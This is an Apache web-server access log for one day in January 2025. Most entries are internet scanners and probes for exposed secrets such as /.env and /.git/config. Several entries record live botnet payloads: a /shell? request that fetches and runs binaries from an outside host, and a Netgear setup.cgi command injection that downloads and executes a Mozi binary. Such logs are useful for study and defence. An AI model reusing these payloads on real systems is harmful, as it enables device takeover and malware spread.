78.153.140.149 - - [15/Jan/2025:04:47:19 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
205.210.31.50 - - [15/Jan/2025:04:48:32 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
141.98.11.119 - - [15/Jan/2025:05:11:38 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
83.222.191.146 - - [15/Jan/2025:05:21:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [15/Jan/2025:05:35:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:05:35:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.98.11.119 - - [15/Jan/2025:05:42:16 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
65.49.20.67 - - [15/Jan/2025:05:50:50 +0000] "\x16\x03\x01" 400 526 "-" "-"
220.147.125.223 - - [15/Jan/2025:05:52:14 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
31.220.1.144 - - [15/Jan/2025:06:01:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
51.8.223.96 - - [15/Jan/2025:06:15:47 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
178.215.236.132 - - [15/Jan/2025:06:20:15 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36 Maxthon/5.2.7.5000"
159.223.205.208 - - [15/Jan/2025:06:27:28 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36"
31.13.224.222 - - [15/Jan/2025:06:41:37 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:06:44:26 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:06:44:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
141.98.11.119 - - [15/Jan/2025:06:45:33 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
45.156.128.129 - - [15/Jan/2025:07:24:33 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
138.68.102.80 - - [15/Jan/2025:07:28:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
138.68.102.80 - - [15/Jan/2025:07:28:55 +0000] "POST /sdk HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
138.68.102.80 - - [15/Jan/2025:07:28:55 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
138.68.102.80 - - [15/Jan/2025:07:28:55 +0000] "GET /odinhttpcall1736926135 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
138.68.102.80 - - [15/Jan/2025:07:28:56 +0000] "GET /HNAP1 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
138.68.102.80 - - [15/Jan/2025:07:28:56 +0000] "GET /evox/about HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
138.68.102.80 - - [15/Jan/2025:07:28:56 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
138.68.102.80 - - [15/Jan/2025:07:28:56 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.99.128.58 - - [15/Jan/2025:07:28:57 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
161.35.196.204 - - [15/Jan/2025:07:28:57 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
167.99.130.2 - - [15/Jan/2025:07:28:57 +0000] "\x16\x03\x01" 400 526 "-" "-"
157.230.119.87 - - [15/Jan/2025:07:28:57 +0000] "GET /v2/_catalog HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
134.209.234.70 - - [15/Jan/2025:07:28:57 +0000] "GET /solr/admin/info/system HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
134.209.245.159 - - [15/Jan/2025:07:28:57 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; Odin; https://docs.getodin.com/)"
167.99.128.58 - - [15/Jan/2025:07:28:57 +0000] "\x16\x03\x01\x01$\x01" 400 526 "-" "-"
167.99.128.58 - - [15/Jan/2025:07:28:57 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/authLogin.cgi" "Go-http-client/1.1"
134.209.234.70 - - [15/Jan/2025:07:28:57 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/solr/admin/info/system" "Go-http-client/1.1"
157.230.119.87 - - [15/Jan/2025:07:28:57 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/v2/_catalog" "Go-http-client/1.1"
161.35.196.204 - - [15/Jan/2025:07:28:57 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
167.99.130.2 - - [15/Jan/2025:07:28:57 +0000] "\x16\x03\x01" 400 526 "-" "-"
134.209.234.70 - - [15/Jan/2025:07:28:58 +0000] "GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
68.183.184.197 - - [15/Jan/2025:07:28:58 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
134.209.234.70 - - [15/Jan/2025:07:28:58 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/solr/admin/cores?action=STATUS&wt=json" "Go-http-client/1.1"
68.183.184.197 - - [15/Jan/2025:07:28:58 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/favicon.ico" "Go-http-client/1.1"
::1 - - [15/Jan/2025:07:29:03 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
179.43.191.146 - - [15/Jan/2025:07:56:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [15/Jan/2025:08:08:56 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11"
5.181.190.248 - - [15/Jan/2025:08:11:25 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:08:11:25 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
165.154.164.112 - - [15/Jan/2025:08:12:00 +0000] "\x16\x03\x01\x01\x17\x01" 400 526 "-" "-"
165.154.164.112 - - [15/Jan/2025:08:12:11 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
165.154.164.112 - - [15/Jan/2025:08:12:16 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.164.112 - - [15/Jan/2025:08:12:16 +0000] "GET / HTTP/1.1" 200 947 "http://34.94.250.181/favicon.ico" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.164.112 - - [15/Jan/2025:08:12:17 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.164.112 - - [15/Jan/2025:08:12:17 +0000] "GET / HTTP/1.1" 200 947 "http://34.94.250.181/robots.txt" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.164.112 - - [15/Jan/2025:08:12:18 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.164.112 - - [15/Jan/2025:08:12:18 +0000] "GET / HTTP/1.1" 200 947 "http://34.94.250.181/sitemap.xml" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
165.154.164.112 - - [15/Jan/2025:08:12:18 +0000] "GET /js/brand.js HTTP/1.1" 200 514 "-" "Go-http-client/1.1"
165.154.164.112 - - [15/Jan/2025:08:12:18 +0000] "GET /js/login.js HTTP/1.1" 200 866 "-" "Go-http-client/1.1"
165.154.164.112 - - [15/Jan/2025:08:12:18 +0000] "GET /config.json HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"
::1 - - [15/Jan/2025:08:12:24 +0000] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) (internal dummy connection)"
46.19.138.234 - - [15/Jan/2025:08:41:45 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.149 - - [15/Jan/2025:08:45:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:08:45:25 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
148.153.45.238 - - [15/Jan/2025:09:08:45 +0000] "GET /BaMl HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [15/Jan/2025:09:08:45 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181:80/BaMl" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [15/Jan/2025:09:08:45 +0000] "GET /ZDqN HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [15/Jan/2025:09:08:45 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181:80/ZDqN" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [15/Jan/2025:09:08:45 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [15/Jan/2025:09:08:45 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [15/Jan/2025:09:08:45 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.45.238 - - [15/Jan/2025:09:08:45 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
87.120.115.119 - - [15/Jan/2025:09:55:29 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 7.1.2; Nexus 6P Build/N2G48C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.107 Mobile Safari/537.36"
78.153.140.149 - - [15/Jan/2025:10:48:32 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:10:48:33 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
45.164.177.54 - - [15/Jan/2025:10:58:34 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://45.164.177.54:10425/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 302 350 "-" "-"
78.153.140.149 - - [15/Jan/2025:11:26:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:11:26:32 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
4.151.230.193 - - [15/Jan/2025:11:46:16 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
45.79.128.205 - - [15/Jan/2025:11:50:21 +0000] "\x16\x03\x01" 400 526 "-" "-"
206.168.34.78 - - [15/Jan/2025:11:51:12 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.78 - - [15/Jan/2025:11:51:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.78 - - [15/Jan/2025:11:51:20 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.78 - - [15/Jan/2025:11:51:21 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.78 - - [15/Jan/2025:11:51:22 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
167.94.146.52 - - [15/Jan/2025:12:22:31 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.146.52 - - [15/Jan/2025:12:22:34 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.52 - - [15/Jan/2025:12:22:34 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.52 - - [15/Jan/2025:12:22:35 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.52 - - [15/Jan/2025:12:22:35 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
139.59.101.104 - - [15/Jan/2025:12:58:02 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
8.210.123.17 - - [15/Jan/2025:13:43:33 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.149 - - [15/Jan/2025:14:04:07 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:14:04:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
88.32.206.69 - - [15/Jan/2025:14:07:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
64.62.197.104 - - [15/Jan/2025:14:14:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/98.0"
179.43.191.146 - - [15/Jan/2025:14:14:56 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
57.128.229.1 - - [15/Jan/2025:14:15:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
57.128.229.1 - - [15/Jan/2025:14:15:13 +0000] "GET /js/brand.js HTTP/1.1" 200 570 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
57.128.229.1 - - [15/Jan/2025:14:15:13 +0000] "GET /js/login.js HTTP/1.1" 200 922 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
64.62.197.96 - - [15/Jan/2025:14:16:40 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0"
64.62.197.93 - - [15/Jan/2025:14:17:04 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/98.0"
5.181.190.248 - - [15/Jan/2025:14:25:13 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:14:25:13 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
66.240.236.116 - - [15/Jan/2025:14:40:39 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.149 - - [15/Jan/2025:14:47:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:14:47:12 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
178.215.236.132 - - [15/Jan/2025:16:06:12 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (iPod; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H143 Safari/600.1.4"
80.82.77.202 - - [15/Jan/2025:16:36:56 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
78.153.140.149 - - [15/Jan/2025:16:41:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:16:41:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
223.206.75.36 - - [15/Jan/2025:16:51:14 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
5.181.190.248 - - [15/Jan/2025:16:52:21 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:16:52:22 +0000] "GET / HTTP/1.1" 200 1742 "http://34.94.250.181:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
206.168.34.221 - - [15/Jan/2025:17:01:15 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.221 - - [15/Jan/2025:17:01:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [15/Jan/2025:17:01:19 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [15/Jan/2025:17:01:19 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.221 - - [15/Jan/2025:17:01:19 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
3.139.77.184 - - [15/Jan/2025:17:05:17 +0000] "\x16\x03\x01" 400 526 "-" "-"
3.139.77.184 - - [15/Jan/2025:17:05:52 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
162.142.125.197 - - [15/Jan/2025:17:36:01 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
162.142.125.197 - - [15/Jan/2025:17:36:06 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [15/Jan/2025:17:36:07 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [15/Jan/2025:17:36:07 +0000] "GET / HTTP/1.1" 200 966 "http://34.94.250.181/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.197 - - [15/Jan/2025:17:36:08 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
170.10.57.102 - - [15/Jan/2025:17:42:38 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
51.159.103.14 - - [15/Jan/2025:17:44:15 +0000] "HEAD / HTTP/1.1" 200 296 "-" "curl/7.81.0"
51.159.103.14 - - [15/Jan/2025:17:44:18 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.103.14 - - [15/Jan/2025:17:44:18 +0000] "GET /favicon.ico HTTP/1.1" 302 328 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.103.14 - - [15/Jan/2025:17:44:18 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.103.14 - - [15/Jan/2025:17:44:19 +0000] "GET /ads.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.103.14 - - [15/Jan/2025:17:44:19 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.103.14 - - [15/Jan/2025:17:44:19 +0000] "GET /app-ads.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.103.14 - - [15/Jan/2025:17:44:20 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.103.14 - - [15/Jan/2025:17:44:20 +0000] "GET /sellers.json HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
51.159.103.14 - - [15/Jan/2025:17:44:20 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.3"
198.235.24.138 - - [15/Jan/2025:18:11:31 +0000] "\x16\x03\x01" 400 526 "-" "-"
198.235.24.138 - - [15/Jan/2025:18:11:32 +0000] "\x16\x03\x01" 400 526 "-" "-"
148.113.210.254 - - [15/Jan/2025:18:20:36 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
18.163.14.203 - - [15/Jan/2025:18:26:35 +0000] "\x16\x03\x01" 400 526 "-" "-"
18.163.14.203 - - [15/Jan/2025:18:27:15 +0000] "HEAD /actuator/env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
198.235.24.133 - - [15/Jan/2025:18:39:39 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
78.153.140.149 - - [15/Jan/2025:18:50:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
